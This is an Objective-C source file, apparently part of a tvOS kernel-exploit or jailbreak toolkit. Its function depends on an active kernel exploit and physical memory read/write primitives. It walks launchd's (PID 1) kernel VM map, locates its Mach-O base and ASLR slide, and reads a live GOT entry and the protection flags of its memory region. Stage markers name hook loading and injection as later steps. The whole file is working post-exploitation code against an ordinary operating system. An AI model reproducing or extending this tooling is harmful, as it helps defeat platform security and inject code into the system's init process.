#import "dt_build725r_launchd_probe.h"
#import "dt_macho_build_version.h"
#import "dt_baked_offsets.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit_gate.h"
#import "primitives.h"
#import "kernel.h"
#import "info.h"

#import <mach-o/loader.h>
#import <stdarg.h>
#import <stdbool.h>
#import <stdint.h>
#import <string.h>

#ifndef DT_BUILD_NUM
#define DT_BUILD_NUM 0
#endif

enum {
    kDT725RStaticImageBase   = 0x100000000ULL,
    kDT725RStaticGotVa       = 0x100065018ULL,
    kDT725RGotDelta          = 0x65018ULL,
    kDT725ROnDiskBindWord    = 0x8010000000000203ULL,
    kDT725RMapEnumLimit      = 512,
    kDT725RLcParseMax        = 64,
    kDT725RMinosExpected     = DT_PACK_BUILD_VERSION(16u, 5u, 0u),
    kDT725RPlatformTvos      = 3u,
};

static void dt725r_log(void (^log)(NSString *line), NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [[DTRunLogger shared] log:msg];
    if (log)
        log(msg);
}

static void dt725r_stage(const char *marker)
{
    [[DTRunLogger shared] logStage:[NSString stringWithUTF8String:marker]];
}

static bool dt725r_kva_canonical(uint64_t kva)
{
    return kva >= 0xfffff00000000000ULL;
}

static bool dt725r_user_ptr_plausible(uint64_t ua)
{
    if (!ua || ua >= 0xfffff00000000000ULL)
        return false;
    return true;
}

static int dt725r_physrw_ready(void)
{
    return dt_phys716_phys_ready()
        && gPrimitives.physreadbuf != NULL
        && gPrimitives.vtophys != NULL;
}

typedef struct {
    bool have_magic;
    uint32_t magic;
    uint32_t cputype;
    uint32_t cpusubtype;
    uint32_t filetype;
    uint32_t flags;
    bool mh_pie;
    bool have_build_version;
    uint32_t platform;
    uint32_t minos;
    uint32_t sdk;
    bool have_lc_main;
    bool have_text;
    uint64_t text_vmaddr;
    uint64_t text_fileoff;
    uint32_t text_initprot;
} dt725r_macho_info_t;

static int dt725r_read_proc(uint64_t proc, uint64_t ua, void *buf, size_t len)
{
    if (!proc || !buf || !len)
        return -1;
    if (!dt725r_user_ptr_plausible(ua))
        return -2;
    return proc_vreadbuf(proc, (const void *)(uintptr_t)ua, buf, len);
}

static bool dt725r_lc_fits(uint32_t lc_off, uint32_t lc_size, uint32_t sizeofcmds)
{
    if (lc_size < sizeof(struct load_command))
        return false;
    if (lc_off > sizeofcmds || lc_size > sizeofcmds - lc_off)
        return false;
    return true;
}

static int dt725r_parse_macho(uint64_t proc, uint64_t base, dt725r_macho_info_t *out)
{
    if (!out)
        return -1;
    memset(out, 0, sizeof(*out));

    struct mach_header_64 mh = {0};
    if (dt725r_read_proc(proc, base, &mh, sizeof(mh)) != 0)
        return -2;

    out->magic = mh.magic;
    out->have_magic = (mh.magic == MH_MAGIC_64);
    out->cputype = mh.cputype;
    out->cpusubtype = mh.cpusubtype;
    out->filetype = mh.filetype;
    out->flags = mh.flags;
    out->mh_pie = ((mh.flags & MH_PIE) != 0);

    if (mh.ncmds == 0 || mh.ncmds > kDT725RLcParseMax)
        return -3;
    if (mh.sizeofcmds < mh.ncmds * sizeof(struct load_command))
        return -4;
    if (mh.sizeofcmds > 16 * 1024)
        return -5;

    uint8_t lcbuf[16 * 1024];
    if (mh.sizeofcmds > sizeof(lcbuf))
        return -6;
    if (dt725r_read_proc(proc, base + sizeof(mh), lcbuf, mh.sizeofcmds) != 0)
        return -7;

    uint32_t off = 0;
    for (uint32_t i = 0; i < mh.ncmds; i++) {
        if (!dt725r_lc_fits(off, ((struct load_command *)(lcbuf + off))->cmdsize, mh.sizeofcmds))
            return -8;
        struct load_command *lc = (struct load_command *)(lcbuf + off);
        if (lc->cmd == LC_BUILD_VERSION && lc->cmdsize >= sizeof(struct build_version_command)) {
            struct build_version_command *bv = (struct build_version_command *)lc;
            out->have_build_version = true;
            out->platform = bv->platform;
            out->minos = bv->minos;
            out->sdk = bv->sdk;
        } else if (lc->cmd == LC_MAIN && lc->cmdsize >= sizeof(struct entry_point_command)) {
            out->have_lc_main = true;
        } else if (lc->cmd == LC_SEGMENT_64 && lc->cmdsize >= sizeof(struct segment_command_64)) {
            struct segment_command_64 *sg = (struct segment_command_64 *)lc;
            if (strncmp(sg->segname, SEG_TEXT, sizeof(sg->segname)) == 0) {
                out->have_text = true;
                out->text_vmaddr = sg->vmaddr;
                out->text_fileoff = sg->fileoff;
                out->text_initprot = sg->initprot;
            }
        }
        off += lc->cmdsize;
        if (off > mh.sizeofcmds)
            return -9;
    }
    return 0;
}

static bool dt725r_macho_passes_contract(const dt725r_macho_info_t *mi)
{
    if (!mi || !mi->have_magic)
        return false;
    if (mi->cputype != CPU_TYPE_ARM64)
        return false;
    if (mi->cpusubtype != CPU_SUBTYPE_ARM64_ALL)
        return false;
    if (mi->filetype != MH_EXECUTE)
        return false;
    if (!mi->mh_pie)
        return false;
    if (!mi->have_build_version)
        return false;
    if (mi->platform != kDT725RPlatformTvos)
        return false;
    if (mi->minos != kDT725RMinosExpected || mi->sdk != kDT725RMinosExpected)
        return false;
    if (!mi->have_lc_main)
        return false;
    if (!mi->have_text)
        return false;
    if (mi->text_vmaddr != kDT725RStaticImageBase)
        return false;
    if (mi->text_fileoff != 0)
        return false;
    if ((mi->text_initprot & (VM_PROT_READ | VM_PROT_EXECUTE)) != (VM_PROT_READ | VM_PROT_EXECUTE))
        return false;
    return true;
}

static void dt725r_log_macho_candidate(void (^log)(NSString *line), uint64_t start, const dt725r_macho_info_t *mi)
{
    dt725r_log(log, @"[*] BUILD102725R_CANDIDATE_START=0x%llx", (unsigned long long)start);
    dt725r_log(log, @"[*] BUILD102725R_MAGIC=0x%x", mi->magic);
    dt725r_log(log, @"[*] BUILD102725R_CPU_TYPE=0x%x", mi->cputype);
    dt725r_log(log, @"[*] BUILD102725R_CPU_SUBTYPE=0x%x", mi->cpusubtype);
    dt725r_log(log, @"[*] BUILD102725R_FILETYPE=%u", mi->filetype);
    dt725r_log(log, @"[*] BUILD102725R_MH_PIE=%@", mi->mh_pie ? @"YES" : @"NO");
    dt725r_log(log, @"[*] BUILD102725R_PLATFORM=%u", mi->platform);
    dt725r_log(log, @"[*] BUILD102725R_MINOS=0x%x", mi->minos);
    dt725r_log(log, @"[*] BUILD102725R_SDK=0x%x", mi->sdk);
    dt725r_log(log, @"[*] BUILD102725R_LC_MAIN=%@", mi->have_lc_main ? @"YES" : @"NO");
    dt725r_log(log, @"[*] BUILD102725R_TEXT_VMADDR=0x%llx", (unsigned long long)mi->text_vmaddr);
    dt725r_log(log, @"[*] BUILD102725R_TEXT_FILEOFF=0x%llx", (unsigned long long)mi->text_fileoff);
}

int dt_build725r_run_readonly_launchd_probe(void (^log)(NSString *line), NSString **verdictOut)
{
    (void)DT_BUILD_NUM;

    dt725r_stage("BUILD102725R_BEGIN");
    dt725r_stage("BUILD102725R_SCOPE=READ_ONLY_LAUNCHD_BASE_GOT_AND_PROTECTION_QUERY");
    dt725r_stage("BUILD102725R_WALL2_ACTIVE=NO");
    dt725r_stage("BUILD102725R_OPAINJECT_ACTIVE=NO");
    dt725r_stage("BUILD102725R_HOOK_LOAD_ATTEMPTED=NO");

    dt725r_log(log, @"[*] BUILD102725R_STATIC_BASE=0x%llx", (unsigned long long)kDT725RStaticImageBase);
    dt725r_log(log, @"[*] BUILD102725R_GOT_STATIC_VA=0x%llx", (unsigned long long)kDT725RStaticGotVa);
    dt725r_log(log, @"[*] BUILD102725R_GOT_DELTA=0x%llx", (unsigned long long)kDT725RGotDelta);
    dt725r_log(log, @"[*] BUILD102725R_ON_DISK_BIND_WORD=0x%llx", (unsigned long long)kDT725ROnDiskBindWord);

    bool phys_ready = dt725r_physrw_ready();
    dt725r_log(log, @"[*] BUILD102725R_PHYSRW_READY=%@", phys_ready ? @"YES" : @"NO");
    if (!phys_ready) {
        dt725r_stage("BUILD102725R_RESULT=PREREQUISITE_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_PREREQUISITE_FAIL";
        return -1;
    }

    if (!dt_kernel_exploit_is_active() || !g_dt_baked_offsets_active) {
        dt725r_stage("BUILD102725R_RESULT=PREREQUISITE_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_PREREQUISITE_FAIL";
        return -2;
    }

    uint64_t proc1 = proc_find(1);
    dt725r_log(log, @"[*] BUILD102725R_PROC1=0x%llx", (unsigned long long)proc1);
    if (!proc1 || !dt725r_kva_canonical(proc1)) {
        dt725r_stage("BUILD102725R_RESULT=PID1_CHAIN_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_PID1_CHAIN_FAIL";
        return -10;
    }

    uint64_t task1 = proc_task(proc1);
    dt725r_log(log, @"[*] BUILD102725R_TASK1=0x%llx", (unsigned long long)task1);
    if (!task1 || !dt725r_kva_canonical(task1)) {
        dt725r_stage("BUILD102725R_RESULT=PID1_CHAIN_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_PID1_CHAIN_FAIL";
        return -11;
    }

    uint64_t map1 = kread_ptr(task1 + koffsetof(task, map));
    dt725r_log(log, @"[*] BUILD102725R_MAP1=0x%llx", (unsigned long long)map1);
    if (!map1 || !dt725r_kva_canonical(map1)) {
        dt725r_stage("BUILD102725R_RESULT=PID1_CHAIN_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_PID1_CHAIN_FAIL";
        return -12;
    }

    uint64_t pmap1 = kread_ptr(map1 + koffsetof(vm_map, pmap));
    dt725r_log(log, @"[*] BUILD102725R_PMAP1=0x%llx", (unsigned long long)pmap1);
    if (!pmap1 || !dt725r_kva_canonical(pmap1)) {
        dt725r_stage("BUILD102725R_RESULT=PID1_CHAIN_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_PID1_CHAIN_FAIL";
        return -13;
    }

    uint64_t sentinel = map1 + koffsetof(vm_map, hdr);
    uint64_t entry = kread_ptr(map1 + koffsetof(vm_map, hdr) + koffsetof(vm_map_links, next));
    uint64_t seen[kDT725RMapEnumLimit];
    unsigned seen_count = 0;
    unsigned enum_count = 0;
    const char *abort_reason = "NONE";

    dt725r_stage("BUILD102725R_MAP_ENUM_BEGIN");
    dt725r_stage("BUILD102725R_BASE_SEARCH_BEGIN");

    uint64_t runtime_base = 0;
    dt725r_macho_info_t best_mi = {0};

    while (entry != sentinel) {
        if (++enum_count > kDT725RMapEnumLimit) {
            abort_reason = "LIMIT";
            break;
        }
        if (!entry || !dt725r_kva_canonical(entry)) {
            abort_reason = "NULL_ENTRY";
            dt725r_stage("BUILD102725R_RESULT=MAP_ENUM_FAIL");
            if (verdictOut)
                *verdictOut = @"BUILD102725R_MAP_ENUM_FAIL";
            goto enum_done_fail;
        }
        for (unsigned i = 0; i < seen_count; i++) {
            if (seen[i] == entry) {
                abort_reason = "CYCLE";
                dt725r_stage("BUILD102725R_RESULT=MAP_ENUM_FAIL");
                if (verdictOut)
                    *verdictOut = @"BUILD102725R_MAP_ENUM_FAIL";
                goto enum_done_fail;
            }
        }
        if (seen_count < kDT725RMapEnumLimit)
            seen[seen_count++] = entry;

        uint64_t start = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, min));
        uint64_t end = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, max));
        if (start >= end || !dt725r_user_ptr_plausible(start)) {
            abort_reason = "INVALID_RANGE";
            dt725r_stage("BUILD102725R_RESULT=MAP_ENUM_FAIL");
            if (verdictOut)
                *verdictOut = @"BUILD102725R_MAP_ENUM_FAIL";
            goto enum_done_fail;
        }

        uint32_t magic_probe = 0;
        if (dt725r_read_proc(proc1, start, &magic_probe, sizeof(magic_probe)) == 0
            && magic_probe == MH_MAGIC_64) {
            dt725r_macho_info_t mi = {0};
            if (dt725r_parse_macho(proc1, start, &mi) == 0 && dt725r_macho_passes_contract(&mi)) {
                dt725r_log_macho_candidate(log, start, &mi);
                if (!runtime_base || start < runtime_base) {
                    runtime_base = start;
                    best_mi = mi;
                }
            }
        }

        entry = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, next));
    }

    dt725r_log(log, @"[*] BUILD102725R_MAP_ENUM_COUNT=%u", enum_count);
    dt725r_log(log, @"[*] BUILD102725R_MAP_ENUM_ABORT_REASON=%s", abort_reason);

    if (strcmp(abort_reason, "NONE") != 0) {
        dt725r_stage("BUILD102725R_RESULT=MAP_ENUM_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_MAP_ENUM_FAIL";
        return -20;
    }

    if (!runtime_base) {
        dt725r_log(log, @"[*] BUILD102725R_BASE_VALIDATION=FAIL");
        dt725r_stage("BUILD102725R_RESULT=BASE_RESOLUTION_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_BASE_RESOLUTION_FAIL";
        return -30;
    }

    dt725r_log(log, @"[*] BUILD102725R_BASE_VALIDATION=PASS");
    dt725r_log(log, @"[*] BUILD102725R_RUNTIME_BASE=0x%llx", (unsigned long long)runtime_base);

    uint64_t slide = runtime_base - kDT725RStaticImageBase;
    uint64_t got_runtime = runtime_base + kDT725RGotDelta;
    dt725r_log(log, @"[*] BUILD102725R_SLIDE=0x%llx", (unsigned long long)slide);
    dt725r_log(log, @"[*] BUILD102725R_GOT_RUNTIME_VA=0x%llx", (unsigned long long)got_runtime);

    uint64_t live_got = 0;
    int got_rc = dt725r_read_proc(proc1, got_runtime, &live_got, sizeof(live_got));
    dt725r_log(log, @"[*] BUILD102725R_GOT_READ_RC=%d", got_rc);
    dt725r_log(log, @"[*] BUILD102725R_GOT_LIVE_VALUE=0x%llx", (unsigned long long)live_got);
    dt725r_stage("BUILD102725R_GOT_VALUE_CLASSIFICATION=OPAQUE_RESOLVED_RUNTIME_VALUE");
    if (got_rc != 0) {
        dt725r_stage("BUILD102725R_RESULT=GOT_READ_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_GOT_READ_FAIL";
        return -40;
    }
    dt725r_stage("BUILD102725R_GOT_READ=PASS");

    entry = kread_ptr(map1 + koffsetof(vm_map, hdr) + koffsetof(vm_map_links, next));
    seen_count = 0;
    enum_count = 0;
    uint64_t got_entry = 0;
    uint64_t got_start = 0;
    uint64_t got_end = 0;
    uint64_t got_flags = 0;

    while (entry != sentinel) {
        if (++enum_count > kDT725RMapEnumLimit)
            break;
        if (!entry || !dt725r_kva_canonical(entry))
            break;
        uint64_t start = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, min));
        uint64_t end = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, max));
        if (got_runtime >= start && got_runtime < end) {
            got_entry = entry;
            got_start = start;
            got_end = end;
            got_flags = kread64(entry + koffsetof(vm_map_entry, flags));
            break;
        }
        entry = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, next));
    }

    if (!got_entry) {
        dt725r_log(log, @"[*] BUILD102725R_GOT_ENTRY_FOUND=NO");
        dt725r_stage("BUILD102725R_RESULT=GOT_ENTRY_LOOKUP_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102725R_GOT_ENTRY_LOOKUP_FAIL";
        return -50;
    }

    uint32_t cur_prot = (uint32_t)((got_flags >> 7) & 0xFu);
    uint32_t max_prot = (uint32_t)((got_flags >> 11) & 0xFu);

    dt725r_log(log, @"[*] BUILD102725R_GOT_ENTRY_FOUND=YES");
    dt725r_log(log, @"[*] BUILD102725R_GOT_ENTRY_KVA=0x%llx", (unsigned long long)got_entry);
    dt725r_log(log, @"[*] BUILD102725R_GOT_ENTRY_START=0x%llx", (unsigned long long)got_start);
    dt725r_log(log, @"[*] BUILD102725R_GOT_ENTRY_END=0x%llx", (unsigned long long)got_end);
    dt725r_log(log, @"[*] BUILD102725R_GOT_ENTRY_FLAGS=0x%llx", (unsigned long long)got_flags);
    dt725r_log(log, @"[*] BUILD102725R_GOT_CURRENT_PROT=%u", cur_prot);
    dt725r_log(log, @"[*] BUILD102725R_GOT_MAX_PROT=%u", max_prot);
    dt725r_stage("BUILD102725R_GOT_ENTRY_QUERY=PASS");

    dt725r_stage("BUILD102725R_RESULT=PASS");
    if (verdictOut)
        *verdictOut = @"BUILD102725R_PASS";
    (void)best_mi;
    return 0;

enum_done_fail:
    dt725r_log(log, @"[*] BUILD102725R_MAP_ENUM_COUNT=%u", enum_count);
    dt725r_log(log, @"[*] BUILD102725R_MAP_ENUM_ABORT_REASON=%s", abort_reason);
    return -20;
}
